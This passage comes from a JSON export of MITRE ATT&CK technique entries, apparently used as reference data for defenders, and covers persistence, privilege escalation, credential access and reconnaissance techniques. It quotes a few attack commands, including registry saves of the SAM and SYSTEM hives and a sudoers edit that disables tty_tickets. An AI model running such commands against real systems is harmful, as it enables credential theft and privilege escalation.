Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.^[[2]](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)^ \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.^[[3]](https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf)^  ","platforms":["Windows","macOS","Linux"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1133":{"id":"T1133","name":"External Remote Services","description":"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.^[[1]](https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac)^\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.^[[2]](https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/)^ Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.^[[3]](https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html)^^[[4]](https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/)^","platforms":["Windows","Linux","Containers","macOS"],"tactics":["Persistence","Initial Access"],"campaigns":["Operation CuckooBees","Night Dragon","2015 Ukraine Electric Power Attack","CostaRicto","SolarWinds Compromise","C0027","Operation Wocao"],"groups":["TeamTNT","FIN13","APT18","TEMP.Veles","Sandworm Team","Scattered Spider","APT41","LAPSUS$","OilRig","GALLIUM","Ke3chang","Wizard Spider","APT29","Kimsuky","FIN5","Threat Group-3390","GOLD SOUTHFIELD","Chimera","Dragonfly","APT28","Leviathan","UNC2452","Night Dragon","Operation Wocao","Dragonfly 2.0","APT34"]},"T1546.006":{"id":"T1546.006","name":"LC_LOAD_DYLIB Addition","description":"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.^[[1]](https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf)^ There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.^[[2]](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)^","platforms":["macOS"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":[]},"T1539":{"id":"T1539","name":"Steal Web Session Cookie","description":"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.^[[1]](https://wunderwuzzi23.github.io/blog/passthecookie.html)^\n\nThere are several examples of malware targeting cookies from web browsers on the local system.^[[2]](https://securelist.com/project-tajmahal/90240/)^^[[3]](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/)^ There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.^[[4]](https://github.com/kgretzky/evilginx2)^^[[5]](https://github.com/muraenateam/muraena)^\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.","platforms":["Linux","macOS","Windows","Office 365","SaaS","Google Workspace"],"tactics":["Credential Access"],"campaigns":["SolarWinds Compromise"],"groups":["LuminousMoth","Evilnum","APT29"]},"T1053.007":{"id":"T1053.007","name":"Container Orchestration Job","description":"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.^[[1]](https://kubernetes.io/docs/concepts/workloads/controllers/job/)^^[[2]](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/)^ An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.^[[3]](https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/)^","platforms":["Containers"],"tactics":["Execution","Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1568.002":{"id":"T1568.002","name":"Domain Generation Algorithms","description":"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.^[[1]](http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf)^^[[2]](https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/)^^[[3]](https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/)^\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.^[[1]](http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf)^^[[2]](https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/)^^[[4]](http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html)^^[[5]](https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html)^\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.^[[4]](http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html)^^[[6]](https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html)^^[[7]](https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/)^","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["APT41","TA551"]},"T1036.007":{"id":"T1036.007","name":"Double File Extension","description":"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: `File.txt.exe` may render in some views as just `File.txt`). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.^[[1]](https://www.pcmag.com/encyclopedia/term/double-extension)^^[[2]](https://socprime.com/blog/rule-of-the-week-possible-malicious-file-double-extension/)^ \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named `Evil.txt.exe` may display as `Evil.txt` to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.^[[2]](https://socprime.com/blog/rule-of-the-week-possible-malicious-file-double-extension/)^\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Mustang Panda"]},"T1548.002":{"id":"T1548.002","name":"Bypass User Account Control","description":"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.^[[1]](https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works)^\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.^[[2]](https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx)^^[[3]](https://msdn.microsoft.com/en-us/library/ms679687.aspx)^ An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.^[[4]](http://www.pretentiousname.com/misc/win7_uac_whitelist2.html)^\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods^[[5]](https://github.com/hfiref0x/UACME)^ that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* `eventvwr.exe` can auto-elevate and execute a specified binary or script.^[[6]](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)^^[[7]](https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware)^\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.^[[8]](http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass)^","platforms":["Windows"],"tactics":["Privilege Escalation","Defense Evasion"],"campaigns":["Operation Honeybee"],"groups":["Evilnum","APT37","BRONZE BUTLER","MuddyWater","Cobalt Group","Earth Lusca","Threat Group-3390","Patchwork","APT29","Honeybee"]},"T1016.001":{"id":"T1016.001","name":"Internet Connection Discovery","description":"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), `tracert`, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.","platforms":["Windows","Linux","macOS"],"tactics":["Discovery"],"campaigns":["SolarWinds Compromise","Operation Wocao"],"groups":["Magic Hound","HEXANE","APT29","Gamaredon Group","TA2541","FIN13","HAFNIUM","Turla","FIN8","UNC2452"]},"T1548.003":{"id":"T1548.003","name":"Sudo and Sudo Caching","description":"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The `sudo` command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"^[[1]](https://www.sudo.ws/)^ Since sudo was made for the system administrator, it has some useful configuration features such as a `timestamp_timeout`, which is the amount of time in minutes between instances of `sudo` before it will re-prompt for a password. This is because `sudo` has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at `/var/db/sudo` with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a `tty_tickets` variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, `/etc/sudoers`, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like `user1 ALL=(ALL) NOPASSWD: ALL`.^[[2]](https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/)^ Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, `/var/db/sudo`'s timestamp can be monitored to see if it falls within the `timestamp_timeout` range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if `tty_tickets` is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled `tty_tickets` to potentially make scripting easier by issuing `echo \\'Defaults !tty_tickets\\' >> /etc/sudoers`.^[[3]](https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does)^ In order for this change to be reflected, the malware also issued `killall Terminal`. As of macOS Sierra, the sudoers file has `tty_tickets` enabled by default.","platforms":["Linux","macOS"],"tactics":["Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1560.003":{"id":"T1560.003","name":"Archive via Custom Method","description":"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.^[[1]](http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf)^","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":["C0017"],"groups":["FIN6","CopyKittens","Mustang Panda","Kimsuky","Lazarus Group"]},"T1578":{"id":"T1578","name":"Modify Cloud Compute Infrastructure","description":"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.^[[1]](https://content.fireeye.com/m-trends/rpt-m-trends-2020)^","platforms":["IaaS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1583.008":{"id":"T1583.008","name":"Malvertising","description":"Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.^[[1]](https://www.spamhaus.com/resource-center/a-surge-of-malvertising-across-google-ads-is-distributing-dangerous-malware/)^ Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.^[[2]](https://labs.guard.io/masquerads-googles-ad-words-massively-abused-by-threat-actors-targeting-organizations-gpus-42ae73ee8a1e)^^[[3]](https://www.ic3.gov/Media/Y2022/PSA221221)^ Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.^[[4]](https://www.sentinelone.com/blog/breaking-down-the-seo-poisoning-attack-how-attackers-are-hijacking-search-results/)^ \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.^[[5]](https://www.bbc.com/news/technology-12891182)^\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.^[[2]](https://labs.guard.io/masquerads-googles-ad-words-massively-abused-by-threat-actors-targeting-organizations-gpus-42ae73ee8a1e)^ Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.^[[1]](https://www.spamhaus.com/resource-center/a-surge-of-malvertising-across-google-ads-is-distributing-dangerous-malware/)^ ","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1069":{"id":"T1069","name":"Permission Groups Discovery","description":"Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.^[[1]](https://www.crowdstrike.com/blog/hidden-administrative-accounts-bloodhound-to-the-rescue/)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers"],"tactics":["Discovery"],"campaigns":["SolarWinds Compromise"],"groups":["TA505","APT3","FIN13","APT29","UNC2452"]},"T1114":{"id":"T1114","name":"Email Collection","description":"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ","platforms":["Windows","Office 365","Google Workspace","macOS","Linux"],"tactics":["Collection"],"campaigns":[],"groups":["Silent Librarian","Magic Hound","Dragonfly"]},"T1003.002":{"id":"T1003.002","name":"Security Account Manager","description":"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* `reg save HKLM\\sam sam`\n* `reg save HKLM\\system system`\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.^[[1]](https://github.com/Neohapsis/creddump7)^\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":["C0017","Night Dragon","Operation CuckooBees"],"groups":["GALLIUM","APT29","FIN13","Dragonfly","Ke3chang","menuPass","Threat Group-3390","Wizard Spider","Night Dragon","Dragonfly 2.0"]},"T1596.002":{"id":"T1596.002","name":"WHOIS","description":"Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.^[[1]](https://www.whois.net/)^\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1542.001":{"id":"T1542.001","name":"System Firmware","description":"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. ^[[1]](https://en.wikipedia.org/wiki/BIOS)^ ^[[2]](https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface)^ ^[[3]](http://www.uefi.org/about)^\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.","platforms":["Windows"],"tactics":["Persistence","Defense Evasion"],"campaigns":[],"groups":[]},"T1594":{"id":"T1594","name":"Search Victim-Owned Websites","description":"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.^[[1]](https://www.comparitech.com/blog/vpn-privacy/350-million-customer-records-exposed-online/)^\n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Silent Librarian","Kimsuky","EXOTIC LILY","Sandworm Team"]},"T1069.003":{"id":"T1069.003","name":"Cloud Groups","description":"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The `Get-MsolRole` PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts ^[[1]](https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrole?view=azureadps-1.0)^^[[2]](https://github.com/True-Demon/raindance)^.\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command `az ad user get-member-groups` will list groups associated to a user account for Azure while the API endpoint `GET https://cloudidentity.googleapis.com/v1/groups` lists group resources available to a user for Google.^[[3]](https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest)^^[[4]](https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/)^^[[5]](https://cloud.google.com/identity/docs/reference/rest)^ In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.^[[6]](https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/)^\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS `GetBucketAcl` API ^[[7]](https://docs.aws.amazon.com/AmazonS3/latest/API/API_GetBucketAcl.html)^. Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.","platforms":["Azure AD","Office 365","SaaS","IaaS","Google Workspace"],"tactics":["Discovery"],"campaigns":["C0027"],"groups":[]},"T1574.011":{"id":"T1574.011","name":"Services Registry Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under `HKLM\\SYSTEM\\CurrentControlSet\\Services`. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. ^[[1]](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights?redirectedfrom=MSDN)^^[[2]](https://www.bleepingcomputer.com/tutorials/how-malware-hides-as-a-service/)^\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service’s Registry tree. For example, the `FailureCommand` key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.^[[3]](https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html)^^[[4]](https://twitter.com/r0wdy_/status/936365549553991680)^\n\nThe `Performance` key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.^[[5]](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)^ If the `Performance` key is not already present and if an adversary-controlled user has the `Create Subkey` permission, adversaries may create the `Performance` key in the service’s Registry tree to point to a malicious DLL.^[[6]](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)^\n\nAdversaries may also add the `Parameters` key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.^[[5]](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)^^[[7]](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_zegost)^ Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll`.^[[2]](https://www.bleepingcomputer.com/tutorials/how-malware-hides-as-a-service/)^","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":["Operation Honeybee"],"groups":[]},"T1596.001":{"id":"T1596.001","name":"DNS/Passive DNS","description":"Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).^[[1]](https://dnsdumpster.com/)^^[[2]](https://www.circl.lu/services/passive-dns/)^ Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1499.003":{"id":"T1499.003","name":"Application Exhaustion Flood","description":"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.^[[1]](https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1195.001":{"id":"T1195.001","name":"Compromise Software Dependencies and Development Tools","description":"Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.^[[1]](https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets)^  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ","platforms":["Linux","macOS","Windows"],"tactics":["Initial Access"],"campaigns":[],"groups":[]},"T1588.004":{"id":"T1588.004","name":"Digital Certificates","description":"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.^[[1]](https://threatpost.com/final-report-diginotar-hack-shows-total-compromise-ca-servers-103112/77170/)^ Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, 